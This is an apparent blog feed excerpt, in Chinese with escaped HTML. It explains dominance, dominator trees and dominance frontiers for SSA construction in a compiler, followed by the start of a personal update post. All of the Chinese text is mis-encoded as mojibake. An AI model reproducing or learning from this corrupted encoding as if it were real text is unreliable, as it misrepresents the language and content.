&lt;h3 id=&quot;0x02-æ”¯é…æ€§dominance&quot;&gt;0x02 æ”¯é…æ€§(Dominance)&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒåœ¨å…¥å£ç»“ç‚¹ä¸ºb0çš„æµå›¾ä¸­ï¼Œå½“ä¸”è¿›å½“biä½äºä»b0åˆ°bjçš„æ¯æ¡è·¯å¾„ä¸Šæ—¶ï¼Œç»“ç‚¹biæ”¯é…bjï¼Œå†™ä½œ &lt;strong&gt;&lt;em&gt;bi dom bj&lt;/em&gt;&lt;/strong&gt;ã€‚æ ¹æ®å®šä¹‰ï¼Œ&lt;strong&gt;&lt;em&gt;bi dom bi&lt;/em&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/2-2020-7-09.jpeg&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒåœ¨è¿™å¼ å›¾ä¸­ç»“ç‚¹1æ”¯é…æ‰€æœ‰çš„èŠ‚ç‚¹ï¼Œå› ä¸ºä»–æ˜¯å…¥å£ç»“ç‚¹ï¼Œæ‰€ä»¥åˆ°è¾¾æ¯ä¸ªç»“ç‚¹éƒ½å¿…é¡»ç»è¿‡å®ƒã€‚ç»“ç‚¹2åªæ”¯é…ä»–è‡ªå·±ï¼Œå› ä¸ºæ²¡æœ‰ç»“ç‚¹å¿…é¡»ç»è¿‡2ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒå¦å¤–ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ¦‚å¿µå°±æ˜¯ &lt;strong&gt;&lt;em&gt;strictly dominates&lt;/em&gt;&lt;/strong&gt;ï¼ˆä¸¥æ ¼æ”¯é…ï¼‰ï¼Œå¦‚æœ &lt;strong&gt;d != n&lt;/strong&gt; ä¸” &lt;strong&gt;d dom n&lt;/strong&gt;ï¼Œ é‚£ä¹ˆ &lt;strong&gt;d sdom m&lt;/strong&gt;ï¼Œä¾‹å¦‚ä¸Šå›¾ä¸­ 4 sdom 5ã€‚è¯´ç™½äº†å°±æ˜¯&lt;strong&gt;ä¸æ˜¯è‡ªå·±æ”¯é…è‡ªå·±&lt;/strong&gt;ã€‚nçš„ä¸¥æ ¼æ”¯é…é›†è®°åš &lt;strong&gt;&lt;em&gt;SDom(n)&lt;/em&gt;&lt;/strong&gt;ï¼Œè¯¥é›†åˆä¸­ï¼Œä¸næœ€è¿‘çš„ç»“ç‚¹ç§°ä¸ºnçš„&lt;strong&gt;ç›´æ¥æ”¯é…ç»“ç‚¹&lt;/strong&gt; &lt;em&gt;(immediate node)&lt;/em&gt;ï¼Œè®°åš &lt;strong&gt;&lt;em&gt;IDom(n)&lt;/em&gt;&lt;/strong&gt;ã€‚cfgçš„entryæ²¡æœ‰ç›´æ¥æ”¯é…ç»“ç‚¹ã€‚ä¾‹å¦‚5çš„ç›´æ¥æ”¯é…ç»“ç‚¹æ˜¯4,7çš„ç›´æ¥æ”¯é…ç»“ç‚¹ä¹Ÿæ˜¯4.&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;SDom(n) = Dom(n)-\{n\}&lt;/script&gt;

&lt;p&gt;â€ƒâ€ƒé‚£ä¹ˆå¦‚ä½•è®¡ç®—æ”¯é…åŸŸDom(n)å‘¢ï¼Œå‚è€ƒã€ŠEngineering a Compilerã€‹è¿™æœ¬ä¹¦ä¸­çš„ä¸æ‡‚ç‚¹ç®—æ³•ï¼Œä¸‹é¢ç»™å‡ºä»‹ç»ï¼Œéå¸¸åˆºæ¿€ï¼Œæ ¸å¿ƒå°±ä¸€å¥è¯ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;Dom(n) = \{n\}\cup(\mathop{\cap}\limits_{m \in preds(n)} Dom(m))&lt;/script&gt;

&lt;p&gt;å…¶å®ä¸Šé¢è¿™ä¸ªå…¬å¼çš„æ„æ€å°±æ˜¯ï¼Œæ±‚nçš„å‰è¶‹çš„æ”¯é…åŸŸçš„äº¤é›†ç„¶åå¹¶ä¸Š{n}ï¼Œå…·ä½“çš„è¿­ä»£ç®—æ³•è¿‡ç¨‹ä¸ºï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/4-2020-7-09.png&quot; alt=&quot;iter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒä¸€ç›´è¿­ä»£CFGçš„Domé›†åˆï¼Œç›´åˆ°ä¸å‘ç”Ÿå˜åŒ–ï¼Œå³åˆ°è¾¾fixed pointï¼Œè‡³äºè¿™ä¸ªè¿­ä»£ç®—æ³•ä¸ºä»€ä¹ˆèƒ½åœä¸‹æ¥æˆ‘è¿™é‡Œå°±ä¸è¯æ˜äº†ï¼Œ&lt;/p&gt;

&lt;h3 id=&quot;0x03-æ”¯é…è€…æ ‘dominator-tree&quot;&gt;0x03 æ”¯é…è€…æ ‘(Dominator Tree)&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒè¿™ä¸ªæ¦‚å¿µæ¯”è¾ƒå¥½ç†è§£ï¼Œæ ¹æ®cfgçš„æ”¯é…ä¿¡æ¯ï¼Œå»ºç«‹ä¸€ä¸ªæ”¯é…æ ‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/3-2020-7-09.png&quot; alt=&quot;dominator_tree&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒè¯¥æ ‘çš„è¾¹ä½¿ç”¨ä¸€ç§ç®€å•çš„æ–¹å¼ç¼–ç äº†IDomé›†åˆã€‚è‹¥mä¸ºIDom(n),åˆ™æ”¯é…è€…æ ‘ä¸­å¿…ç„¶æœ‰ä¸€æ¡è¾¹ä»mæŒ‡å‘nï¼Œå³nä¸ºmçš„å­ç»“ç‚¹ã€‚æ¯”å¦‚3,4,6éƒ½æ˜¯2çš„å­ç»“ç‚¹ï¼Œå°½ç®¡6å¹¶ä¸æ˜¯2çš„ç›´æ¥åç»§ã€‚&lt;/p&gt;

&lt;p&gt;å› æ­¤æ ¹æ®ä¸Šé¢çš„ç®—æ³•è®¡ç®—å‡ºçš„Domä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„å»ºç«‹Dominator Tree,è¿™é‡Œç»™å‡ºæ ‘ä¸Šçš„æ•°æ®å±•ç¤ºï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;B0&lt;/th&gt;
      &lt;th&gt;B1&lt;/th&gt;
      &lt;th&gt;B2&lt;/th&gt;
      &lt;th&gt;B3&lt;/th&gt;
      &lt;th&gt;B4&lt;/th&gt;
      &lt;th&gt;B5&lt;/th&gt;
      &lt;th&gt;B6&lt;/th&gt;
      &lt;th&gt;B7&lt;/th&gt;
      &lt;th&gt;B8&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Dom&lt;/td&gt;
      &lt;td&gt;{0}&lt;/td&gt;
      &lt;td&gt;{0,1}&lt;/td&gt;
      &lt;td&gt;{0,1,2}&lt;/td&gt;
      &lt;td&gt;{0,1,3}&lt;/td&gt;
      &lt;td&gt;{0,1,3,4}&lt;/td&gt;
      &lt;td&gt;{0,1,5}&lt;/td&gt;
      &lt;td&gt;{0,1,5,6}&lt;/td&gt;
      &lt;td&gt;{0,1,5,7}&lt;/td&gt;
      &lt;td&gt;{0,1,5,8}&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IDom&lt;/td&gt;
      &lt;td&gt;N&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¶åæ ¹æ®Domå€¼è®¡ç®—å‡ºIDomå€¼ï¼Œå®é™…ä¸ŠIDomå€¼å°±æ˜¯å…¶çˆ¶ç»“ç‚¹ï¼Œç„¶åæ ¹æ®IDomå€¼æ„é€ Dominator Treeå³å¯ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/7-2020-7-09.png&quot; alt=&quot;cfg&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x04-æ”¯é…è¾¹ç•Œdominator-frontier&quot;&gt;0x04 æ”¯é…è¾¹ç•Œ(Dominator Frontier)&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒåœ¨æ„é€ SSAçš„è¿‡ç¨‹ä¸­ï¼Œè‹¥è€ƒè™‘ä½¿ç”¨æœ€å¤§é™æ€å•å¤åˆ¶ä¼šå¯¼å…¥å¤§é‡çš„phi-functionï¼Œæ¯”å¦‚ï¼Œå‡å¦‚CFGä¸­ç»“ç‚¹nä¸­çš„ä¸€ä¸ªå®šä¹‰ï¼Œè¯¥å€¼åˆ°è¾¾æŸç»“ç‚¹mæ—¶ï¼Œè‹¥ &lt;em&gt;n Dom m&lt;/em&gt; åˆ™è¯¥å€¼å¹¶ä¸éœ€è¦phi-functionï¼Œå› ä¸ºè¯¥å®šä¹‰åªç”¨ä¸€ç§æƒ…å†µæ‰èƒ½å¯¼è‡´æ— æ³•ä¼ æ’­åˆ°mï¼Œå°±æ˜¯åœ¨nã€mä¹‹é—´é‡æ–°å®šä¹‰äº†è¯¥å€¼ã€‚&lt;/p&gt;

&lt;p&gt;å› æ­¤åªæœ‰åœ¨nçš„æ”¯é…åŸŸå¤–çš„æ±‡åˆç‚¹ï¼Œæ‰éœ€è¦å¼•å…¥phi-functionï¼Œè¿™å°±æ˜¯æ”¯é…è¾¹ç•Œï¼Œå³ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;næ”¯é…mçš„ä¸€ä¸ªå‰è¶‹&lt;/li&gt;
  &lt;li&gt;nå¹¶ä¸ä¸¥æ ¼æ”¯é…m&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æœ‰è¿™ç§æ€§è´¨çš„èŠ‚ç‚¹mé›†åˆç§°ä¸ºnçš„æ”¯é…è¾¹ç•Œï¼Œè®°åšDF(n)ï¼Œä¾‹å¦‚ä¸Šå›¾ä¸­ &lt;em&gt;DF(2) = 7&lt;/em&gt;&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;DF(n) = \{m\mid q \in preds(m), n \in Dom(q)\}&lt;/script&gt;

&lt;p&gt;è¯´äººè¯å°±æ˜¯ï¼Œæ‰€æœ‰æœ€è¿‘ä¸èƒ½è¢«nä¸¥æ ¼æ”¯é…çš„èŠ‚ç‚¹çš„é›†åˆå°±æ˜¯DF(n)ï¼Œå³æ”¯é…è¾¹ç•Œã€‚å¦‚ä¸‹å›¾ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;DF(5) = {4, 5, 12, 13}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/5-2020-7-09.png&quot; alt=&quot;df&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¯æ˜¯æ”¯é…è¾¹ç•Œçš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬ä¸Šé¢å·²ç»è§£é‡Šè¿‡äº†ï¼Œåªæœ‰åœ¨åˆ°è¾¾ç»“ç‚¹ n çš„æ”¯é…è¾¹ç•Œçš„æ—¶å€™ï¼Œæ‰éœ€è¦è€ƒè™‘å…¶ä»–è·¯å¾„æ˜¯å¦æœ‰å¯¹ n ç»“ç‚¹ä¸­æŸå€¼çš„å®šä¹‰å¹¶ä¸”æ’å…¥é€‚å½“çš„ Î¦-functionã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/6-2020-7-09.png&quot; alt=&quot;df1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒè™½ç„¶ä»ç»“ç‚¹1çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒæ”¯é…ç»“ç‚¹ï¼ˆä¾‹å¦‚9ï¼Œ10ï¼Œ11ï¼‰å¯èƒ½ä¼šç”¨åˆ°x:3ï¼Œä½†å¹¶ä¸æ„å‘³ç€è¿™äº›èŠ‚ç‚¹é‡Œä¸éœ€è¦æ’å…¥Ï•\phiÏ•-functionçš„ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒç»“ç‚¹ 5 å®šä¹‰äº†å€¼ x := 4ï¼Œç»“ç‚¹ 5 æ²¡æœ‰æ”¯é…ç»“ç‚¹å¹¶ä¸”ç»“ç‚¹ 9 å°±æ˜¯ç»“ç‚¹ 5 çš„æ”¯é…è¾¹ç•Œï¼Œåœ¨è¿™é‡Œéœ€è¦è€ƒè™‘ä»ä»å…¶ä»–è·¯å¾„ä¼ æ’­åˆ°æ­¤çš„å¯¹å˜é‡ x çš„å…¶ä»–å®šä¹‰ï¼Œä¹Ÿå°±æ˜¯ç»“ç‚¹ 1 ä¸­çš„å®šä¹‰ x := 3ã€‚æ‰€ä»¥åœ¨ç»“ç‚¹ 9 éœ€è¦æ’å…¥ä¸€ä¸ªå…³äºå˜é‡ x çš„ Î¦-functionã€‚åŒç†åœ¨ç»“ç‚¹ 10 çš„å¼€å¤´ä¹Ÿéœ€è¦æ’å…¥ä¸€ä¸ª Î¦-functionï¼Œå¦å¤–ç”±äº Î¦-function ä¼šäº§ç”Ÿæ–°çš„å®šä¹‰ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦åœ¨ç»“ç‚¹ 9 çš„æ”¯é…è¾¹ç•Œç»“ç‚¹ 11 çš„å¼€å¤´æ’å…¥ Î¦-functionã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯å¦‚æœè¦ç¡®å®šæ”¯é…è¾¹ç•Œçš„è¯ï¼Œéœ€è¦å…ˆæ„é€ å‡ºæ”¯é…è€…æ ‘ï¼Œç„¶åå€ŸåŠ©äºæ”¯é…è€…æ ‘æ¥å¾—å‡ºæ”¯é…è¾¹ç•Œã€‚&lt;/p&gt;

&lt;h3 id=&quot;0x05-æ±‚æ”¯é…è¾¹ç•Œ&quot;&gt;0x05 æ±‚æ”¯é…è¾¹ç•Œ&lt;/h3&gt;

&lt;p&gt;è¿™é‡Œç›´æ¥ç»™å‡ºç®—æ³•ä¼ªä»£ç ï¼š&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Null&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nodes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multiple&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;predecessors&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;predecessor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;DF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;runner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒè¯¥ç®—æ³•ä¼šå®šä½åˆ°CFGä¸­çš„å„ä¸ªæ±‡åˆç‚¹å°±ã€‚æ¥ä¸‹æ¥ï¼Œå¯¹jçš„æ¯ä¸ªå‰è¶‹pï¼Œä»på¼€å§‹æ²¿ç€æ”¯é…è€…æ ‘å‘ä¸Šèµ°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªç›´æ¥æ”¯é…jçš„ç»“ç‚¹ã€‚æŒ‰ç…§ä¸‹å›¾ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/7-2020-7-09.png&quot; alt=&quot;df2&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;B1 å¯¹äºå…¶åœ¨CFGä¸­çš„å‰è¶‹B0ï¼Œå‘ç°B0æ˜¯IDom(B1)ï¼Œå› æ­¤ä¸è¿›å…¥whileå¾ªç¯ã€‚å¯¹äºå…¶å‰è¶‹B3,æ­¤æ—¶å°†B1æ·»åŠ åˆ°DF(B3)ä¸­ï¼Œæ¥ä¸‹æ¥è¿›å…¥B1ï¼Œå°†B1æ·»åŠ åˆ°DF(B1)ä¸­ï¼Œç„¶åå‰è¿›åˆ°B0ï¼Œç„¶ååœæ­¢ã€‚&lt;/li&gt;
  &lt;li&gt;B3 å¯¹äºå…¶åœ¨CFGä¸­çš„å‰è¶‹B2ï¼Œå‘ç°B2ä¸æ˜¯IDom(B3)ï¼Œæ­¤æ—¶å°†B3æ·»åŠ åˆ°DF(B2)ä¸­ï¼Œæ¥ä¸‹æ¥å‰è¿›åˆ°B1ï¼Œè€ŒB1æ˜¯IDom(B3)æ•…åœæ­¢whileå¾ªç¯ã€‚å¯¹äºå…¶å‰è¶‹ç»“ç‚¹B7ï¼Œå‘ç°B7ä¸æ˜¯IDom(B3)ï¼Œæ­¤æ—¶å°†B3æ·»åŠ åˆ°DF(B7)ä¸­ï¼Œç„¶åå‰è¿›åˆ°B5ï¼Œå°†B3æ·»åŠ åˆ°DF(B5)ä¸­ï¼Œç„¶åå‰è¿›åˆ°B1åœæ­¢ã€‚&lt;/li&gt;
  &lt;li&gt;B7 å¯¹äºå…¶åœ¨CFGä¸­çš„å‰è¶‹B6ï¼Œå‘ç°ä¸æ˜¯IDom(B7)ï¼Œå°†B7æ·»åŠ åˆ°DF(B6)ä¸­ï¼Œæ¥ä¸‹æ¥å‰è¿›åˆ°B5ï¼Œåœæ­¢whileå¾ªç¯ã€‚å¯¹äºå…¶å‰è¶‹èŠ‚ç‚¹B8ï¼Œå°†B7æ·»åŠ åˆ°DF(B8)ï¼Œç„¶åå‰è¿›åˆ°B5ï¼Œç„¶ååœæ­¢ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;äºæ˜¯å¾—åˆ°æ”¯é…è¾¹ç•Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Â &lt;/th&gt;
      &lt;th&gt;B0&lt;/th&gt;
      &lt;th&gt;B1&lt;/th&gt;
      &lt;th&gt;B2&lt;/th&gt;
      &lt;th&gt;B3&lt;/th&gt;
      &lt;th&gt;B4&lt;/th&gt;
      &lt;th&gt;B5&lt;/th&gt;
      &lt;th&gt;B6&lt;/th&gt;
      &lt;th&gt;B7&lt;/th&gt;
      &lt;th&gt;B8&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;DF&lt;/td&gt;
      &lt;td&gt;Null&lt;/td&gt;
      &lt;td&gt;{B1}&lt;/td&gt;
      &lt;td&gt;{B3}&lt;/td&gt;
      &lt;td&gt;{B1}&lt;/td&gt;
      &lt;td&gt;Null&lt;/td&gt;
      &lt;td&gt;{B3}&lt;/td&gt;
      &lt;td&gt;{B7}&lt;/td&gt;
      &lt;td&gt;{B3}&lt;/td&gt;
      &lt;td&gt;{B7}&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;0x05-æ€»ç»“&quot;&gt;0x05 æ€»ç»“&lt;/h3&gt;

&lt;p&gt;â€ƒâ€ƒåˆ°è¿™é‡Œå·®ä¸å¤šå°±ç»“æŸäº†ï¼Œè¿™å‡ ä¸ªç®—æ³•æ¯”è¾ƒæœ‰è¶£çš„ç‚¹åœ¨äºï¼Œæ•°æ®æµåˆ†æçš„å¤§éƒ¨åˆ†ç®—æ³•éƒ½æ˜¯ä¸åŠ¨ç‚¹ç®—æ³•ï¼Œç„¶è€Œä¸ºå•¥èƒ½åˆ°è¾¾ä¸åŠ¨ç‚¹å±å®æ˜¯ä¸€ä¸ªéœ€è¦æˆ‘ä»¬æ€è€ƒçš„é—®é¢˜ï¼Œäº‹å®ä¸Šå¦‚æœä¸€ä¸ªé›†åˆåªè¿›è¡Œå¹¶çš„è¿ç®—ï¼Œé‚£ä¹ˆå¯¹å…¶è¿›è¡Œè¿­ä»£å¾€å¾€å¯ä»¥è¾¾åˆ°fixed pointï¼Œä½ æƒ³ä¸€æƒ³æ˜¯ä¸æ˜¯;)&lt;/p&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="compiler" /><summary type="html">â€ƒâ€ƒå’Œå¥½å“¥ä»¬ä¸€èµ·å‚åŠ äº†æ¯•æ˜‡æ¯ç¼–è¯‘ç³»ç»Ÿå¤§èµ›ï¼Œè¦æ‰‹æ’•ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œé‚¢ç¥å¸¦æˆ‘ä»¬æï¼ŒæŒ‰ç…§llvmçš„ç»“æ„è¿›è¡Œè®¾è®¡ï¼Œå¹¶ä¸”æŠŠYuLangçš„éƒ¨åˆ†ä»£ç ç›´æ¥è¿ç§»äº†è¿‡æ¥ï¼Œæˆ‘ç›®å‰çš„æ„Ÿå—æ˜¯ï¼Œè¿™ä¸ªé¡¹ç›®çš„æ‰©å±•æ€§çœŸçš„å¥½ã€‚æˆ‘ä¸»è¦è´Ÿè´£å¹³å°æ— å…³ä¼˜åŒ–ï¼Œç”±äºå­˜åœ¨PassManagerè¿™ç§ç»“æ„ï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦å†™ç›¸å…³çš„passå³å¯å®Œæˆä¼˜åŒ–ï¼Œä¸å¾—ä¸è¯´è¿™ç§è®¾è®¡æ˜¯çœŸçš„ç¥å¥‡ã€‚</summary></entry><entry><title type="html">æœ€è¿‘å¹²äº†å•¥</title><link href="http://localhost:4000/blog/summary" rel="alternate" type="text/html" title="æœ€è¿‘å¹²äº†å•¥" /><published>2020-06-29T00:00:00+08:00</published><updated>2020-06-29T00:00:00+08:00</updated><id>http://localhost:4000/blog/summary</id><content type="html" xml:base="http://localhost:4000/blog/summary">&lt;p&gt;â€ƒâ€ƒå¤§äºŒä¸‹ç¨€é‡Œç³Šæ¶‚å°±åœ¨å®¶æ··è¿‡å»äº†ï¼Œæ€»æ„Ÿè§‰å•¥ä¹Ÿæ²¡å¹²ï¼Œå¿ƒé‡Œæœ‰äº›è¿‡æ„ä¸å»ã€‚æ€»çš„æ¥è¯´æŠ€æœ¯æ–¹é¢çš„è¿›æ­¥é€Ÿåº¦ååˆ†ä¹‹ç¼“æ…¢ï¼Œåº”è¯¥æ˜¯åœ¨å®¶é‡Œæ¯”è¾ƒæ€ å •ï¼Œä¸»è¦å¹²äº†ä¸€ä¸‹äº‹æƒ…ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å†™äº†ELFSignå’ŒKuiè¿™ä¸ªé¡¹ç›®ï¼Œå®é™…ä¸Šä¹‹èŠ±äº†ä¸¤å‘¨æ—¶é—´ï¼Œæ•ˆæœè¿˜å¯ä»¥&lt;/li&gt;
  &lt;li&gt;åœ¨é•¿äº­æ‰“å·¥ï¼Œä¸»è¦åšäº†phpè§£å¯†ç›¸å…³å·¥ä½œï¼Œç ´è§£äº†å¸‚åœºä¸Šå¸¸è§çš„phpåŠ å¯†ï¼Œå½“ç„¶æ¯”è¾ƒå¤´é“çš„å•†ä¸šåŒ–åŠ å¯†ï¼Œæ¯”å¦‚z5å°±æ²¡èƒ½ç ´è§£ï¼Œä½†æ˜¯æ´¥æ´¥ä¹é“çš„zendåŠ å¯†è¿˜æ˜¯æå®šäº†ï¼Œä¹‹åå¯ä»¥æ€»ç»“ä¸€ä¸‹ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸­é€”å­¦äº†ä¸€é˜µæ“ä½œç³»ç»Ÿï¼Œæœ¬æ¥æ‰“ç®—ç³»ç»Ÿçš„å­¦ä¸€ä¸‹ï¼Œè¢«æ‰“æ–­äº†ï¼Œæœ‰ç‚¹ç€æ€¥ï¼Œå¾—èµ¶ç´§å¼€å§‹å­¦äº†ã€‚&lt;/li&gt;
  &lt;li&gt;5æœˆä»½æˆ‘æ„Ÿè§‰è¿‡å¾—ç¨€é‡Œç³Šæ¶‚çš„ï¼Œä¸»è¦åœ¨åº”ä»˜å­¦æ ¡çš„è¯¾ï¼Œå¥½çƒ¦ï¼Œä¼°è®¡è¿™å­¦æœŸåˆ†æŒºé«˜çš„ï¼Œä½†æ˜¯æ²¡å­¦åˆ°å•¥ä¸œè¥¿ï¼Œå¿ƒé‡Œå¥½éš¾å—ã€‚&lt;/li&gt;
  &lt;li&gt;å…­æœˆå‚åŠ ç¼–è¯‘ç³»ç»Ÿå¤§èµ›ï¼Œè¦å†™ä¸ªç¼–è¯‘å™¨ï¼Œæˆ‘è´Ÿè´£å¹³å°æ— å…³çš„ä¼˜åŒ–ï¼Œå¼€å§‹è¯»ã€Šç¼–è¯‘å™¨è®¾è®¡ã€‹è¿™æœ¬ä¹¦ã€‚&lt;/li&gt;
&lt;/ul&gt;

